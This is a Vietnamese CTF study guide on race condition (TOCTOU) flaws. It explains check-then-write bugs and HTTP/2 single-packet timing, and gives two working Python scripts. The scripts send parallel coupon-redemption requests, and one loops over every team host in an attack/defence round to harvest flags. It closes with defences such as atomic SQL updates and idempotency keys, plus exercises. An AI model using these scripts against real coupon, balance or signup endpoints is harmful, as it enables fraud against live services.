Race Condition

Khi server phải làm 2 bước cho 1 thao tác — "kiểm tra điều kiện" rồi "thực hiện" — luôn có một khoảng thời gian cực ngắn ở giữa. Nếu bạn gửi nhiều request giống hệt nhau CÙNG LÚC, nhiều request có thể "lọt" qua bước kiểm tra trước khi bất kỳ request nào kịp cập nhật xong — dùng 1 coupon nhiều lần, rút tiền/điểm nhiều lần hơn mức cho phép.

00 / TÓM TẮT 1 PHÚT

Race Condition là gì, để làm gì?

Nhiều thao tác tưởng "một bước" thực ra gồm 2 bước ở server: đọc trạng thái hiện tại (vd "số dư còn 100 điểm?"), rồi ghi trạng thái mới (vd "trừ 100 điểm, số dư = 0"). Nếu 2 request giống hệt nhau tới server gần như đồng thời, cả hai có thể cùng đọc thấy "còn 100 điểm" (vì request đầu chưa kịp ghi xong), rồi cả hai cùng thực hiện trừ tiền — bạn dùng 1 coupon / rút tiền 2 lần dù đáng lẽ chỉ được phép 1 lần.

Nếu chỉ nhớ một điều Mọi chức năng có giới hạn số lần ("chỉ dùng được 1 lần", "không được âm", "chỉ 1 người thắng") đều đáng thử gửi nhiều request giống hệt nhau thật sát thời điểm nhau — không phải gửi nhanh liên tiếp (vẫn có độ trễ giữa các lần gửi tuần tự), mà là gửi song song thật sự cùng một lúc.

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

TOCTOU (Time-Of-Check to Time-Of-Use) — tên gọi chung cho lớp lỗi này: khoảng thời gian giữa lúc kiểm tra điều kiện và lúc dùng kết quả kiểm tra đó để hành động, nếu trạng thái có thể đổi trong khoảng đó bởi 1 luồng/request khác, kết quả kiểm tra không còn đúng nữa.
Concurrency (đồng thời) — nhiều việc xảy ra "cùng lúc". Với web, nghĩa là nhiều request được server xử lý chồng lấp thời gian nhau (không nhất thiết chạy thật sự song song trên nhiều CPU — chỉ cần xen kẽ đủ để 1 request chưa kịp "ghi xong" trước khi request khác "đọc" cùng dữ liệu).
Single-packet attack — kỹ thuật dùng HTTP/2 để gửi nhiều request trong cùng 1 gói TCP (thay vì nhiều kết nối riêng), gần như loại bỏ hoàn toàn độ trễ mạng/jitter giữa các request — khiến chúng tới server thực sự cùng lúc, tăng mạnh tỷ lệ race condition thành công.

Code hay viết (thiếu khóa đồng bộ — không atomic):

# Python/Flask — kiểm tra rồi mới ghi, KHÔNG atomic
coupon = db.get_coupon(code)
if not coupon.used:        # BƯỚC ĐỌC
    apply_discount()
    coupon.used = True        # BƯỚC GHI -- có khoảng trễ giữa đọc và ghi!
    db.save(coupon)
02 / VÌ SAO LỖ HỔNG TỒN TẠI

Kiểm tra và ghi không phải 1 hành động nguyên tử

Trong đầu lập trình viên, "kiểm tra coupon chưa dùng rồi đánh dấu đã dùng" là một việc. Nhưng với CPU/database, đó luôn là ít nhất 2 bước riêng biệt: đọc giá trị từ database, rồi (sau khi tính toán xong) ghi giá trị mới lại. Giữa 2 bước này có độ trễ (dù chỉ vài mili-giây) — nếu 2 request tới gần như cùng lúc, cả hai có thể cùng đọc được giá trị "chưa dùng" trước khi request nào kịp ghi "đã dùng" lại — cả hai đều đi qua điều kiện kiểm tra.

Cách vá đúng là biến 2 bước này thành 1 thao tác nguyên tử (atomic) — database hỗ trợ sẵn (transaction + lock, hoặc update có điều kiện trong 1 câu lệnh) nhưng lập trình viên phải chủ động dùng, không tự nhiên có nếu chỉ viết code "đọc rồi ghi" tuần tự như ví dụ ở mục 01.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Dòng thời gian của 2 request chồng lấp nhau

Nếu A và B không chồng lấp (B gửi SAU KHI A đã ghi xong "used=true"), B sẽ đọc thấy "đã dùng", bị từ chối — đây là hành vi đúng. Toàn bộ kỹ thuật khai thác race condition là cố ép B gửi tới server trong đúng khung thời gian hẹp mà A chưa kịp ghi xong — càng gửi nhiều request song song (không phải tuần tự), xác suất có ít nhất 2 request rơi vào khung đó càng cao.

06 / PAYLOAD & KỸ THUẬT ĐẦY ĐỦ

Các cách tạo request đồng thời, từ dễ tới chuẩn

A. Multi-threading (Python) dễ làm, đủ dùng nhiều trường hợp

Dùng ThreadPoolExecutor hoặc asyncio gửi nhiều request cùng lúc. Đơn giản nhất, đủ ăn với nhiều challenge CTF không cần độ chính xác cao.

B. Single-packet attack (HTTP/2) chuẩn nhất, cần target hỗ trợ HTTP/2

Ý tưởng: gửi gần hết các request trong 1 frame TCP duy nhất, chỉ thiếu 1 byte cuối của mỗi request, giữ server "treo" chờ — rồi gửi nốt phần thiếu của TẤT CẢ request cùng 1 lúc. Server nhận được toàn bộ request gần như trong cùng 1 khoảnh khắc, loại bỏ hầu hết jitter mạng giữa các kết nối riêng lẻ. Kỹ thuật này triển khai phức tạp bằng tay — nên dùng qua Turbo Intruder (mục 07) thay vì tự viết.

C. Tăng số lượng request (brute volume)

Nếu không chắc server có window race hẹp hay rộng, tăng số request đồng thời (20 → 50 → 100) — xác suất ít nhất 2 request rơi đúng khung thời gian hẹp tăng theo số lượng gửi.

import re, requests
from concurrent.futures import ThreadPoolExecutor

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")

def exploit_race(host, workers=30):
    url = f"http://{host}/redeem-coupon"
    def attempt(_):
        return requests.post(url, json={"code": "SALE50"}, timeout=5).text
    with ThreadPoolExecutor(max_workers=workers) as ex:
        for text in ex.map(attempt, range(workers)):
            m = FLAG_RE.search(text)
            if m:
                return m.group()
    return None

print("FLAG:", exploit_race("TARGET_IP"))

(C) Bản A/D tái dùng — chạy mọi đội, mọi round

import re, requests
from concurrent.futures import ThreadPoolExecutor

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")

def exploit_race(host, workers=30):
    try:
        url = f"http://{host}/redeem-coupon"
        def attempt(_):
            try:
                return requests.post(url, json={"code": "SALE50"}, timeout=5).text
            except requests.RequestException:
                return ""
        with ThreadPoolExecutor(max_workers=workers) as ex:
            for text in ex.map(attempt, range(workers)):
                m = FLAG_RE.search(text)
                if m:
                    return m.group()
    except Exception:
        pass
    return None

if __name__ == "__main__":
    for host in open("teams.txt").read().split():
        flag = exploit_race(host)
        if flag:
            print(f"{host} {flag}")
            with open("flags.txt", "a") as f:
                f.write(f"{flag}\n")
Nếu threading không đủ nhanhThử tăng max_workers lên 50-100, hoặc thử gửi chính xác cùng 1 thời điểm bằng threading.Barrier (mọi thread tạo request xong, đợi nhau ở vạch xuất phát, rồi cùng gửi 1 lúc) thay vì để ThreadPoolExecutor tự xếp lịch.

10 / PHÒNG THỦ — KHÓ CHẶN BẰNG WAF, GIỐNG IDOR

Vì sao Race Condition cũng khó chặn bằng WAF

Khác biệt quan trọngRace condition không có payload bất thường — mọi request trong cuộc tấn công đều giống hệt 1 request hợp lệ, chỉ khác ở việc chúng đến cùng lúc. WAF dựa trên nội dung từng request riêng lẻ không có cách nào phân biệt được.
Cách hạn chế qua WAF/hạ tầngHiệu quả
Rate-limit số request/giây tới cùng 1 endpoint theo sessionGiảm được số request lọt qua trong 1 đợt tấn công, không triệt tiêu hoàn toàn (vẫn có thể có 2 request lọt trong giới hạn rate-limit)
Giới hạn số kết nối đồng thời từ 1 sessionHạn chế kỹ thuật multi-threading cơ bản, nhưng single-packet attack (1 kết nối, nhiều request) vẫn không bị ảnh hưởng

Phòng thủ thật sự (thêm lock/transaction atomic trong code) không thể làm trong A/D vì cấm sửa source. Giống IDOR và Type Juggling, đây là nhóm lỗ hổng thiên về tấn công hơn phòng thủ trong khuôn khổ cuộc thi.

12 / NHẬN DIỆN & GIỚI HẠN

Khi nào ĐƯỢC / KHÔNG dùng

Tình huống
✅Thao tác "đọc rồi ghi" không atomic (code kiểm tra điều kiện ở 1 câu lệnh, ghi kết quả ở câu lệnh khác, không bọc transaction/lock).
❌App dùng database transaction đúng cách với mức cô lập (isolation level) đủ nghiêm, hoặc dùng update có điều kiện nguyên tử (vd SQL UPDATE ... WHERE used=false trong 1 câu lệnh, kiểm tra rows affected).
❌Thao tác có idempotency key bắt buộc và được kiểm tra đúng (mỗi request có ID duy nhất, server từ chối request trùng ID dù gửi đồng thời).
13 / BÀI TẬP & THUẬT NGỮ

Luyện tập

⭐ Làm lại: dựng ví dụ mục 09 bằng tay bằng Burp (Send group in parallel), đếm số lần coupon được áp dụng thành công.

Gợi ý nếu kẹtNếu Burp không có tính năng group, dùng trực tiếp script Python (A) ở mục 08 thay thế.

⭐⭐ Đổi 1 biến: endpoint rút tiền kiểm tra số dư đúng cách bằng SQL atomic (UPDATE balance SET amount = amount - 100 WHERE amount >= 100), nhưng endpoint ĐĂNG KÝ username duy nhất lại không atomic. Viết race condition khai thác việc đăng ký trùng username.

Gợi ý nếu kẹtGửi nhiều request đăng ký CÙNG username đồng thời, xem có bao nhiêu tài khoản được tạo thành công với cùng 1 tên — lẽ ra chỉ 1.

⭐⭐⭐⭐ Tự nghĩ: ThreadPoolExecutor với 50 worker vẫn chỉ cho 1 request thành công mỗi lần thử — window race có vẻ rất hẹp. Đề xuất 2 cách cải thiện độ đồng thời mà không cần cài thêm extension Burp.

Gợi ý nếu kẹt(1) Dùng asyncio+aiohttp với cùng 1 connection pool, giảm overhead TCP handshake riêng lẻ; (2) Dùng threading.Barrier(n) để đảm bảo tất cả thread đã chuẩn bị xong request mới đồng loạt gọi .send(), thay vì để scheduler Python tự quyết định thứ tự.
